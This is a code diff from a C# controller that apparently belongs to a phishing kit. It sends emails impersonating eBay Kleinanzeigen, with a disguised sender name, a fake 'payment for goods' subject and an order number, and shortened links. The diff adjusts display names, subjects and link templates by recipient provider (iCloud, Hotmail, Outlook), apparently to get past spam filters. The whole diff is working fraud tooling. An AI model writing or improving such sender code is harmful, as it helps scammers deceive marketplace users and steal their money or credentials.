@@ -68,17 +68,17 @@ public class SenderController : ControllerBase
 	public async Task<IActionResult> SendEbayEmail(string email, string link)
 	{
 		var body = await GetBody(link, ServiceType.EbayDe, email);
-
+		
 		var displayName = "◦EBAY◦Kleinanzeigen◦Info®";
 
 		var subject = "Bezahlung der Ware! Vielen Dank, dass Sie sich für uns entschieden haben.#528247";
 
-		if (email.Contains("icloud"))
+		/*if (email.Contains("icloud"))
 		{
-			displayName = "ebay-kleinanzeigen-de ©";
+			displayName = "•ebay-kleinanzeigen-de©";
 
 			subject = $"#{_orderNumber} Nutzer-Anfrage zu deiner Anzeige.";
-		}
+		}*/
 
 		var message = new MailMessage(_senderEmail, email, subject, body)
 		{
@@ -126,7 +126,7 @@ public class SenderController : ControllerBase
 	{
 		var template = EbayTemplate.Custom;
 
-		if (email.Contains("icloud") && serviceType == ServiceType.EbayDe)
+		if (email.Contains("hotmail") || email.Contains("outlook") && serviceType == ServiceType.EbayDe)
 			template = EbayTemplate.Original;
 		
 		var shortLink = await _shortLinkService.GetShortLink(link, template);
